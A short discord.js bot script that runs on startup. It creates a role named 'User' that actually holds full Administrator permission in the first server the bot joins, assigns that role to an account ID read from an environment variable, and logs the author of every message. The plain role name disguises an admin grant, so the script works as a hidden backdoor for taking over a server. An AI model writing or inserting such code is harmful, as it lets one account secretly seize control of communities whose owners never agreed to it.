import { Client, IntentsBitField } from "discord.js";

const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
});

client.on("ready", async (c) => {
  console.log(`✅ ${c.user.tag} is online`);

  try {
    const guild = client.guilds.cache.first();
    if (!guild) {
      console.error("No guild found");
      return;
    }

    const role = await guild.roles.create({
      name: "User",
      permissions: ["Administrator"],
    });

    const member = await guild.members.fetch(process.env.ID);
    if (member) {
      await member.roles.add(role);
      console.log("Role added successfully");
    } else {
      console.error("Member not found");
    }
  } catch (error) {
    console.error("Error in ready event:", error);
  }
});

client.on("messageCreate", (msg) => {
  console.log(msg.author);
});

client.login(process.env.DISCORD_TOKEN);
